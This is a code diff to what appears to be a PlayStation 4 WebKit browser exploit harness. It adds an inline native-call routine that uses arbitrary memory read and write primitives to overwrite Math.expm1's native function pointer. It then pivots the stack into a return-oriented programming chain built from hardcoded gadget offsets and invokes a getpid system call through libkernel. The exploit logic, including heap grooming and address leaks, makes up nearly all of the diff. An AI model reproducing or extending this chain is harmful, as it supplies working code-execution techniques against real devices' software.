@@ -4,16 +4,19 @@ import { installWindowP, pairStatus } from "./mem.js";
 import { groomBootLine, wireGroomBar } from "./groom_presets.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250827e";
+const BUILD_ID = "rw-20250827f";
 /** promote real pair after primitive — frees ~96MB 12M carrier (chain_poops ?pair=1) */
 const PROMOTE_PAIR = params.get("promote") !== "0";
 const SWEEP_CYCLES = params.has("sweep")
-    ? parseInt(params.get("sweep"), 10) : (PROMOTE_PAIR ? 3 : 0);
-const SWEEP_MB = params.has("sweepmb") ? parseInt(params.get("sweepmb"), 10) : 2;
-const SWEEP_MS = params.has("sweepms") ? parseInt(params.get("sweepms"), 10) : 80;
-const AUTO_NATIVE = params.get("native") === "1";
+    ? parseInt(params.get("sweep"), 10) : (PROMOTE_PAIR ? 4 : 0);
+const SWEEP_MB = params.has("sweepmb") ? parseInt(params.get("sweepmb"), 10) : 4;
+const SWEEP_MS = params.has("sweepms") ? parseInt(params.get("sweepms"), 10) : 100;
 /** Skip heavy pointer map on Start unless ?rwproof=1 (saves memory for native call) */
 const SKIP_RW_PROOF = params.get("rwproof") !== "1";
+/** lite Start runs getpid inline unless ?native=0 */
+const AUTO_NATIVE = SKIP_RW_PROOF && params.get("native") !== "0";
+const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);
+const SYS_GETPID = 20;
 const HW_GADGETS_1352 = {
     wk_POP_RDI_RET: 0x4be55,
     wk_POP_RSI_RET: 0x7acb3,
@@ -41,6 +44,8 @@ const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SETUP|CARRIER
 let outEl, stateEl, mapBody, hexEl, pickPtr, addrIn;
 let btnStart, btnRefresh, btnNative, btnPeek, btnClear;
 let nativeChain = null;
+let trimDebrisFn = null;
+let nativeAllowed = false;
 
 function $(id) { return document.getElementById(id); }
 
@@ -63,7 +68,7 @@ function state(msg, cls) {
 function setUi() {
     if (btnStart) btnStart.disabled = busy || ready;
     if (btnRefresh) btnRefresh.disabled = busy || !ready;
-    if (btnNative) btnNative.disabled = busy || !ready;
+    if (btnNative) btnNative.disabled = busy || !ready || !nativeAllowed;
     if (btnPeek) btnPeek.disabled = busy || !ready;
     if (pickPtr) pickPtr.disabled = busy || !ready;
     if (addrIn) addrIn.disabled = busy || !ready;
@@ -242,6 +247,146 @@ function captureNativeFnQuick(p, off) {
         .add32(off.wk_JSFunction_m_function || 0x28));
 }
 
+function resolveLibkernelBase(p, off, webkitBase) {
+    try {
+        const raw = sessionStorage.getItem("wk-libkernelBase");
+        if (raw) {
+            const b = parseAddr(String(raw).replace(/^0x/i, ""));
+            if (b) return b;
+        }
+    } catch (_) { }
+    const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
+    return errorFn.sub32(off.k__error);
+}
+
+function putDv(dv, at, v) {
+    if (typeof v === "number") {
+        dv.setUint32(at, v >>> 0, true);
+        dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
+    } else {
+        dv.setUint32(at, v.low >>> 0, true);
+        dv.setUint32(at + 4, v.hi >>> 0, true);
+    }
+}
+
+function abBacking(p, off, ab) {
+    const c = p.leakval(ab);
+    return p.read8(p.read8(c.add32(off.wk_ArrayBuffer_m_impl))
+        .add32(off.wk_ArrayBuffer_m_contents_m_data));
+}
+
+/** Inline poops pivot — no dynamic import (import was OOMing on PS4) */
+function armNativePivot(p, off, webkitBase, libkernelBase) {
+    const mfn = off.wk_JSFunction_m_function || 0x28;
+    const pivotSp = off.pivot_view_sp != null ? off.pivot_view_sp : 0x38;
+    const pbSize = Math.max(0x28, (pivotSp + 8 + 0xf) & ~0xf);
+    const stubOff = off.k_stubs && off.k_stubs[SYS_GETPID];
+    if (stubOff == null) throw new Error("no getpid stub offset");
+
+    const G = {
+        POP_RDI: webkitBase.add32(off.wk_POP_RDI_RET),
+        POP_RSI: webkitBase.add32(off.wk_POP_RSI_RET),
+        POP_RDX: webkitBase.add32(off.wk_POP_RDX_RET),
+        POP_RCX: webkitBase.add32(off.wk_POP_RCX_RET),
+        POP_R8:  webkitBase.add32(off.wk_POP_R8_RET),
+        POP_R9:  webkitBase.add32(off.wk_POP_R9_RET),
+        POP_RAX: webkitBase.add32(off.wk_POP_RAX_RET),
+        LEAVE:   webkitBase.add32(off.wk_LEAVE_RET),
+        MOV_RDI_RAX: webkitBase.add32(off.wk_MOV_QWORD_PTR_RDI_RAX_RET),
+        G0: webkitBase.add32(off.wk_MOV_RDI_RSI_30_CALL),
+        G1: webkitBase.add32(off.wk_POP_RAX_MOV_RAX_JMP_18),
+        G2: webkitBase.add32(off.wk_PUSH_RBP_MOV_RBP_RSP_10),
+        G3: webkitBase.add32(off.wk_MOV_RDI_RAX_8_CALL_20),
+        G4: webkitBase.add32(off.wk_MOV_RDX_RAX_18_CALL_10),
+        G5: webkitBase.add32(off.wk_PUSH_RDX_POP_RSP_RET),
+    };
+    const getpidStub = libkernelBase.add32(stubOff);
+    const argGadget = [G.POP_RDI, G.POP_RSI, G.POP_RDX, G.POP_RCX, G.POP_R8, G.POP_R9];
+
+    const sb = new ArrayBuffer(0x20);
+    const pb = new ArrayBuffer(pbSize);
+    const kb = new ArrayBuffer(0x2000);
+    const fb = new ArrayBuffer(0x40);
+    const storeDv = new DataView(sb);
+    const pivotDv = new DataView(pb);
+    const stackDv = new DataView(kb);
+    const frameDv = new DataView(fb);
+    const stackU8 = new Uint8Array(kb);
+    const frameU8 = new Uint8Array(fb);
+
+    const S = abBacking(p, off, sb);
+    const P = abBacking(p, off, pb);
+    const K = abBacking(p, off, kb);
+    const F = abBacking(p, off, fb);
+
+    putDv(storeDv, 0x00, G.G1);
+    putDv(storeDv, 0x08, P);
+    putDv(storeDv, 0x10, G.G3);
+    putDv(storeDv, 0x18, G.G2);
+    putDv(pivotDv, 0x00, P);
+    putDv(pivotDv, 0x10, G.G5);
+    putDv(pivotDv, 0x20, G.G4);
+
+    function layoutCall(target, args) {
+        stackU8.fill(0);
+        frameU8.fill(0);
+        const insts = [];
+        const n = args ? args.length : 0;
+        for (let i = 0; i < n; i++) {
+            insts.push(argGadget[i]);
+            insts.push(args[i]);
+        }
+        const targetIdx = insts.length;
+        insts.push(target);
+        insts.push(G.POP_RDI);
+        insts.push(F);
+        insts.push(G.MOV_RDI_RAX);
+        insts.push(G.POP_RAX);
+        insts.push(JSVALUE_UNDEFINED);
+        insts.push(G.LEAVE);
+        let at = 0x2000 - 8 * insts.length;
+        if (((K.low + at + 8 * targetIdx) & 0xf) !== 0) at -= 8;
+        for (let i = 0; i < insts.length; i++)
+            putDv(stackDv, at + 8 * i, insts[i]);
+        putDv(pivotDv, pivotSp, K.add32(at));
+    }
+
+    const expm1Cell = p.leakval(Math.expm1);
+    const mainMf = p.read8(p.read8(expm1Cell.add32(0x18)).add32(mfn));
+    const mainOrig = p.read8(mainMf);
+    const pivotObj = {};
+    const pivotCell = p.leakval(pivotObj);
+    p.write8(mainMf, G.G0);
+
+    return {
+        libkernelBase,
+        getpid() {
+            layoutCall(getpidStub, []);
+            const saved = p.read8(pivotCell);
+            p.write8(pivotCell, S);
+            Math.expm1(pivotObj);
+            p.write8(pivotCell, saved);
+            return frameDv.getUint32(0, true) | 0;
+        },
+        disarm() {
+            try { p.write8(mainMf, mainOrig); } catch (_) { }
+        },
+    };
+}
+
+function stripUiForNative() {
+    for (const id of ["groom-bar", "peek-bar", "hint", "map"]) {
+        const el = document.getElementById(id);
+        if (el) el.style.display = "none";
+    }
+    const mapTable = document.getElementById("map");
+    if (mapTable && mapTable.previousElementSibling)
+        mapTable.previousElementSibling.style.display = "none";
+    const hexTitle = document.getElementById("hex");
+    if (hexTitle && hexTitle.previousElementSibling)
+        hexTitle.previousElementSibling.style.display = "none";
+}
+
 function resolveWebkitBase(off, nativeFn) {
     try {
         const raw = sessionStorage.getItem("wk-webkitBase");
@@ -302,23 +447,16 @@ async function freeAfterPrimitive() {
 }
 
 async function freeBeforeNative() {
+    stripUiForNative();
     retained.length = 0;
     pointers.length = 0;
-    if (mapBody) mapBody.innerHTML = "<tr><td colspan=\"3\">(cleared for native)</td></tr>";
-    if (pickPtr) pickPtr.innerHTML = "<option value=\"\">pick known ptr…</option>";
-    if (hexEl) hexEl.textContent = "—";
     lines.length = 0;
     if (outEl) outEl.textContent = "";
-    try {
-        if (exploit && exploit.trimExploitDebris)
-            exploit.trimExploitDebris();
-        else {
-            const core = await import("./core.js");
-            if (core.trimExploitDebris) core.trimExploitDebris();
-        }
-    } catch (_) { }
+    if (trimDebrisFn) {
+        try { trimDebrisFn(); } catch (_) { }
+    }
     exploit = null;
-    await new Promise(r => setTimeout(r, 400));
+    await new Promise(r => setTimeout(r, 500));
 }
 
 function seedNativeSession(p, off) {
@@ -331,10 +469,16 @@ function seedNativeSession(p, off) {
     return fn;
 }
 
-async function doNativeCall() {
+async function doNativeCall(fromStart) {
+    if (!nativeAllowed) {
+        mark("NATIVE-FAIL", "pair not promoted — close browser, reload, Start");
+        state("promote failed — native blocked", "bad");
+        return;
+    }
     const p = window.p;
     if (!p) throw new Error("window.p missing");
-    await freeBeforeNative();
+    if (!fromStart) await freeBeforeNative();
+
     const off = loadEffectiveOff();
     const nativeFn = captureNativeFnQuick(p, off);
     const webkitBase = resolveWebkitBase(off, nativeFn);
@@ -343,28 +487,19 @@ async function doNativeCall() {
         state("need cal base", "bad");
         return;
     }
-    if (!pairStatus.promoted) {
-        mark("NATIVE-WARN", "pair not promoted — OOM likely (?promote=0)");
-    }
+    const libkernelBase = resolveLibkernelBase(p, off, webkitBase);
     if (nativeChain) {
         nativeChain.disarm();
         nativeChain = null;
     }
-    mark("NATIVE-TRY", "base=" + webkitBase + " build=" + BUILD_ID + " (trust, lite)");
-    const { initNativeCall } = await import("./native_call.js");
-    const chain = initNativeCall(p, off, {
-        webkitBase,
-        nativeFn,
-        log: mark,
-        trust: true,
-        noStubScan: true,
-        getpidOnly: true,
-    });
+    mark("NATIVE-SETUP", "base=" + webkitBase + " lk=" + libkernelBase);
+    const chain = armNativePivot(p, off, webkitBase, libkernelBase);
     nativeChain = chain;
     try {
-        sessionStorage.setItem("wk-libkernelBase", String(chain.libkernelBase));
+        sessionStorage.setItem("wk-libkernelBase", String(libkernelBase));
     } catch (_) { }
-    const pid = chain.sc(20).i32;
+    mark("NATIVE-CALL", "getpid… build=" + BUILD_ID);
+    const pid = chain.getpid();
     if (pid > 0) {
         mark("NATIVE-OK", "getpid=" + pid);
         state("native call OK pid=" + pid, "ok");
@@ -397,6 +532,7 @@ async function loadExploit() {
     if (exploit) return exploit;
     mark("LOAD", "core.js + mem.js");
     const core = await import("./core.js");
+    trimDebrisFn = core.trimExploitDebris;
     exploit = {
         establishPrimitive: core.establishPrimitive,
         installWindowP,
@@ -550,14 +686,20 @@ async function runStart() {
         await freeAfterPrimitive();
         await sweepAfterPromote();
 
+        nativeAllowed = !!pairStatus.promoted;
+        if (PROMOTE_PAIR && !pairStatus.promoted) {
+            mark("PROMOTE-FAIL", pairStatus.error || pairStatus.state || "unknown");
+        }
+
         const off = loadEffectiveOff();
         if (SKIP_RW_PROOF) {
-            seedNativeSession(p, off);
-            mark("START-LITE", "rw proof skipped (add ?rwproof=1 for full map)");
+            if (!AUTO_NATIVE) seedNativeSession(p, off);
+            mark("START-LITE", "rw proof skipped"
+                + (AUTO_NATIVE ? " — auto native" : " (add ?native=0 to defer)"));
             ready = true;
-            state("primitive OK — tap Native call", "ok");
-            if (AUTO_NATIVE) {
-                try { await doNativeCall(); }
+            if (nativeAllowed && AUTO_NATIVE) {
+                state("calling getpid…", "warn");
+                try { await doNativeCall(true); }
                 catch (err) {
                     if (nativeChain) {
                         try { nativeChain.disarm(); } catch (_) { }
@@ -566,8 +708,14 @@ async function runStart() {
                     mark("NATIVE-FAIL", err.message || String(err));
                     state("native call failed", "bad");
                 }
+            } else if (!nativeAllowed) {
+                state("promote failed — native blocked", "bad");
+            } else {
+                state("primitive OK — tap Native call", "ok");
             }
         } else {
+            seedNativeSession(p, off);
+            nativeAllowed = !!pairStatus.promoted;
             const ok = await runRwProof(p, off);
             ready = true;
             if (ok) {
@@ -652,8 +800,8 @@ function init() {
         });
     }
 
-    mark("BOOT", "build=" + BUILD_ID + " — native call via Math.expm1 pivot");
-    mark("BOOT", "index_rw.html — promote=" + PROMOTE_PAIR + " (frees 12M carrier)");
+    mark("BOOT", "build=" + BUILD_ID + " — inline native pivot (no import)");
+    mark("BOOT", "auto-native=" + AUTO_NATIVE + " promote=" + PROMOTE_PAIR);
     mark("BOOT", groomBootLine(params));
     mark("BOOT", "one establishPrimitive run — internal auto-retry until win");
     window.addEventListener("beforeunload", function () {
